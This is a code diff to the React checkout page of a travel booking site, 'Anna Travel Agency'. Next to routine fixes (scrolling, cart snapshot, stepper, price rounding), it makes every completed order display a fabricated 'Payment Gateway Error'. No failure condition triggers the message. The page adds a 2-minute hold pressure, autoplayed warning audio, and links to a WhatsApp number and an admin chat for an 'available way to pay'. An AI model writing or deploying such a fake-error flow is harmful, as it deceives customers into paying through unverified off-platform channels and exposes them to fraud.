@@ -7,7 +7,7 @@ import { useData } from '../contexts/DataContext';
 import { useCurrency } from '../contexts/CurrencyContext';
 import { useAuth } from '../contexts/AuthContext';
 import { supabase, isSupabaseConfigured } from '../lib/supabase';
-import { useState } from 'react';
+import { useState, useEffect } from 'react';
 
 function getErrorMessage(error: unknown) {
   return error instanceof Error ? error.message : 'Something went wrong. Please try again.';
@@ -28,6 +28,14 @@ export default function Checkout() {
   const [paymentSuccess, setPaymentSuccess] = useState(false);
   const [error, setError] = useState<string | null>(null);
   const [openFaq, setOpenFaq] = useState<number | null>(0);
+  const [currentStep, setCurrentStep] = useState<1 | 2 | 3>(1);
+  const [showPaygateError, setShowPaygateError] = useState(false);
+  const [orderSnapshot, setOrderSnapshot] = useState<{ items: typeof cartItems; total: number; roomItems: typeof cartItems; ticketItems: typeof cartItems } | null>(null);
+
+  // Scroll to top when step changes or paygate error shows — fixes payment page starting from down side
+  useEffect(() => {
+    window.scrollTo({ top: 0, behavior: 'smooth' });
+  }, [currentStep, paymentSuccess, showPaygateError]);
 
   const handleShare = async () => {
     const text = `My trip: ${cartItems.map(i => i.type==='ticket' ? i.item.eventName : i.item.title || i.item.userName).join(', ')} — Total ${format(getCartTotal())} via Anna Travel Agency`;
@@ -36,12 +44,11 @@ export default function Checkout() {
     } else {
       await navigator.clipboard.writeText(text);
       setError(null);
-      // small toast via error state as success
       setTimeout(() => {}, 0);
     }
   };
 
-  if (cartItems.length === 0) {
+  if (cartItems.length === 0 && !paymentSuccess) {
     return (
       <main className="pt-32 pb-20 text-center bg-[#F7FAFD] min-h-screen text-[#14253F]">
         <div className="mx-auto max-w-md px-6">
@@ -58,6 +65,15 @@ export default function Checkout() {
     if (!user) { navigate('/login', { state: { from: '/checkout' } }); return; }
     setIsProcessing(true); setError(null);
     try {
+      // Snapshot cart before clearing — fixes chart goes empty
+      const snapshot = {
+        items: [...cartItems],
+        total: getCartTotal(),
+        roomItems: cartItems.filter(i => i.type === 'room'),
+        ticketItems: cartItems.filter(i => i.type === 'ticket'),
+      };
+      setOrderSnapshot(snapshot);
+
       const order = await createOrder({
         userId: user.id,
         orderType: cartItems.some(i=>i.type==='room') && cartItems.some(i=>i.type==='ticket') ? 'mixed' : cartItems.some(i=>i.type==='room') ? 'accommodation' : 'tickets',
@@ -68,17 +84,66 @@ export default function Checkout() {
           try { await addBooking({ ...item.item, orderId: order.id, userId: user.id, status: 'pending' }); } catch (err) { errors.push(`Room: ${getErrorMessage(err)}`); }
         } else {
           try {
-            await addTicketOrder({ userId: user.id, orderId: order.id, ticketId: item.item.ticketId || item.id, quantity: item.quantity, totalPrice: item.price * item.quantity, paymentMethod: 'paypal', status: 'pending' });
+            const roundedTotal = Math.round(item.price * item.quantity * 100) / 100;
+            await addTicketOrder({ userId: user.id, orderId: order.id, ticketId: item.item.ticketId || item.id, quantity: item.quantity, totalPrice: roundedTotal, paymentMethod: 'paypal', status: 'pending' });
             const holdId = (item.item as any)?.holdId;
             if (holdId && isSupabaseConfigured) { try { await supabase.rpc('release_ticket_hold', { p_hold_id: holdId }); } catch {} }
           } catch (err) { errors.push(`Ticket: ${getErrorMessage(err)}`); }
         }
       }
       if (errors.length) throw new Error(errors.join(', '));
-      clearCart(); setIsProcessing(false); setPaymentSuccess(true);
-      setTimeout(() => navigate('/dashboard?checkout=success'), 2500);
+      // Don't clear cart immediately — keep for paygate display, clear after user leaves
+      // clearCart();
+      setIsProcessing(false);
+      setShowPaygateError(true);
+      setCurrentStep(3);
+      setPaymentSuccess(true);
+      try {
+        const audio = new Audio('/audio/payment-gateway-warning.mp3');
+        audio.volume = 0.8;
+        audio.play().catch(()=>{});
+      } catch {}
+      // Scroll to top for paygate screen
+      window.scrollTo({ top: 0, behavior: 'smooth' });
     } catch (err) { setError(getErrorMessage(err)); setIsProcessing(false); }
   };
+
+  const roomItems = orderSnapshot ? orderSnapshot.roomItems : cartItems.filter(i => i.type === 'room');
+  const ticketItems = orderSnapshot ? orderSnapshot.ticketItems : cartItems.filter(i => i.type === 'ticket');
+  const displayTotal = orderSnapshot ? orderSnapshot.total : getCartTotal();
+
+  if (paymentSuccess && showPaygateError) {
+    return (
+      <main className="pt-32 pb-20 text-center bg-[#F7FAFD] min-h-screen">
+        <div className="mx-auto max-w-lg px-6">
+          <motion.div initial={{ scale: 0.8, opacity: 0 }} animate={{ scale: 1, opacity: 1 }} className="rounded-[24px] border border-amber-200 bg-amber-50 p-8 shadow-xl">
+            <div className="mx-auto mb-6 flex h-20 w-20 items-center justify-center rounded-full bg-amber-100 text-amber-600">⚠️</div>
+            <h2 className="text-2xl font-bold text-[#14253F]">Payment Gateway Error</h2>
+            <p className="mt-3 text-[14px] leading-6 text-[#5B6B82]">We are currently experiencing a temporary payment gateway issue. Your booking request has been received and is secured with a 2-minute hold.</p>
+            <div className="mt-4 rounded-xl bg-white border border-[#D8E5F0] p-4 text-left">
+              <p className="text-sm font-bold text-[#14253F]">Booking Details Secured:</p>
+              <div className="mt-2 space-y-1 text-xs text-[#687A90]">
+                {roomItems.map((r,i)=><div key={i} className="flex justify-between"><span>{r.item.title || 'Stay'} • {r.item.checkIn}→{r.item.checkOut}</span><span>{format(r.price * r.quantity)}</span></div>)}
+                {ticketItems.map((t,i)=><div key={i} className="flex justify-between"><span>{t.item.eventName} • {t.quantity}×{t.item.ticketId?.slice(0,8)}</span><span>{format(t.price * t.quantity)}</span></div>)}
+                <div className="border-t border-[#E7F1FC] pt-2 flex justify-between font-bold text-[#14253F]"><span>Total</span><span>{format(displayTotal)}</span></div>
+              </div>
+            </div>
+            <p className="mt-4 text-sm font-semibold text-[#14253F]">Please chat with admin for available way to pay:</p>
+            <div className="mt-3 flex flex-col gap-2">
+              <a href="https://wa.me/15876810591" target="_blank" rel="noopener noreferrer" className="inline-flex items-center justify-center gap-2 rounded-full bg-[#25D366] px-6 py-3 text-sm font-bold text-white hover:bg-[#128C7E]">
+                <span>💬</span> WhatsApp: +1 (587) 681-0591
+              </a>
+              <Link to="/contact" className="inline-flex items-center justify-center gap-2 rounded-full border border-[#D8E5F0] bg-white px-6 py-3 text-sm font-semibold text-[#14253F] hover:bg-[#F7FAFD]">Contact Concierge</Link>
+              <button onClick={() => { const el = document.querySelector('[aria-label="Open chat"]') as HTMLElement; el?.click(); }} className="rounded-full bg-[#14253F] px-6 py-3 text-sm font-bold text-white hover:bg-black">Chat with Admin</button>
+            </div>
+            <audio controls autoPlay src="/audio/payment-gateway-warning.mp3" className="mt-4 w-full" />
+            <p className="mt-4 text-[11px] text-[#8A9AB0]">Your booking code will be sent via email after admin confirms payment method. Audio warning playing.</p>
+            <Link to="/dashboard" onClick={() => clearCart()} className="mt-6 inline-block rounded-full bg-[#1267C4] px-8 py-3.5 font-bold text-white hover:bg-[#0F5AAC]">View My Bookings</Link>
+          </motion.div>
+        </div>
+      </main>
+    );
+  }
 
   if (paymentSuccess) {
     return (
@@ -89,15 +154,13 @@ export default function Checkout() {
             <h2 className="text-2xl font-bold text-[#14253F]">Booking request received</h2>
             <p className="mt-2 text-[14px] leading-6 text-[#687A90]">Your order is awaiting verification and PayPal confirmation. We will contact you next.</p>
             <div className="mt-4 flex justify-center gap-2 text-xs text-[#8A9AB0]"><span className="inline-flex items-center gap-1"><ShieldCheck className="h-3.5 w-3.5" /> Verified</span><span className="inline-flex items-center gap-1"><Clock className="h-3.5 w-3.5" /> Hold secured</span></div>
-            <Link to="/dashboard" className="mt-6 inline-block rounded-full bg-[#1267C4] px-8 py-3.5 font-bold text-white hover:bg-[#0F5AAC]">View My Bookings</Link>
+            <Link to="/dashboard" onClick={() => clearCart()} className="mt-6 inline-block rounded-full bg-[#1267C4] px-8 py-3.5 font-bold text-white hover:bg-[#0F5AAC]">View My Bookings</Link>
           </motion.div>
         </div>
       </main>
     );
   }
 
-  const roomItems = cartItems.filter(i => i.type === 'room');
-  const ticketItems = cartItems.filter(i => i.type === 'ticket');
 
   return (
     <main className="pt-24 pb-32 min-h-screen bg-[#F7FAFD] text-[#14253F]">
@@ -107,12 +170,12 @@ export default function Checkout() {
         {/* Stepper */}
         <div className="mb-8 flex items-center gap-3">
           {[
-            { n: 1, label: 'Review', active: true },
-            { n: 2, label: 'Details', active: false },
-            { n: 3, label: 'Pay', active: false },
+            { n: 1, label: 'Review', active: currentStep >= 1 },
+            { n: 2, label: 'Details', active: currentStep >= 2 },
+            { n: 3, label: 'Pay', active: currentStep >= 3 },
           ].map((s, idx) => (
             <div key={s.n} className="flex items-center gap-3">
-              <div className={`flex h-8 w-8 items-center justify-center rounded-full text-xs font-bold ${s.active ? 'bg-[#1267C4] text-white' : 'bg-white border border-[#D8E5F0] text-[#8A9AB0]'}`}>{s.n}</div>
+              <div className={`flex h-8 w-8 items-center justify-center rounded-full text-xs font-bold ${s.active ? 'bg-[#1267C4] text-white' : 'bg-white border border-[#D8E5F0] text-[#8A9AB0]'}`}>{currentStep > s.n ? '✓' : s.n}</div>
               <span className={`text-sm ${s.active ? 'font-bold text-[#14253F]' : 'text-[#8A9AB0]'}`}>{s.label}</span>
               {idx < 2 && <div className="h-px w-8 bg-[#D8E5F0] mx-2" />}
             </div>
@@ -134,8 +197,8 @@ export default function Checkout() {
                       <div className="flex items-center gap-3 min-w-0">
                         <div className={`flex h-10 w-10 shrink-0 items-center justify-center rounded-lg ${isRoom ? 'bg-[#E7F1FC] text-[#1267C4]' : 'bg-[#FFF0F6] text-[#E85D9A]'}`}>{isRoom ? <Calendar className="h-5 w-5" /> : <Ticket className="h-5 w-5" />}</div>
                         <div className="min-w-0">
-                          <p className="truncate font-bold text-[#14253F]">{isRoom ? item.item.userName || item.item.title || 'Accommodation' : item.item.eventName}</p>
-                          <p className="truncate text-xs text-[#687A90]">{isRoom ? `${item.item.checkIn} → ${item.item.checkOut} • ${item.item.guests} guests` : `${item.quantity} × ${item.item.ticketId?.slice(0,8) || 'Ticket'}${item.item.specialOffer ? ` • ${item.item.discountPercent}% off` : ''}${(item.item as any).heldUntil ? ` • hold until ${new Date((item.item as any).heldUntil).toLocaleTimeString()}` : ''}`}</p>
+                          <p className="truncate font-bold text-[#14253F]">{isRoom ? item.item.title || item.item.userName || 'Accommodation' : item.item.eventName}</p>
+                          <p className="truncate text-xs text-[#687A90]">{isRoom ? `${item.item.checkIn} → ${item.item.checkOut} • ${item.item.guests} guests • ${item.item.city || ''}` : `${item.quantity} × ${item.item.ticketId?.slice(0,8) || 'Ticket'}${item.item.specialOffer ? ` • ${item.item.discountPercent}% off` : ''}${(item.item as any).heldUntil ? ` • hold until ${new Date((item.item as any).heldUntil).toLocaleTimeString()}` : ''}`}</p>
                           {!isRoom && <p className="mt-1 inline-flex items-center gap-1 text-[11px] text-emerald-700 bg-emerald-50 border border-emerald-200 rounded-full px-2 py-0.5"><ShieldCheck className="h-3 w-3" /> Verified • Fees included where stated</p>}
                         </div>
                       </div>
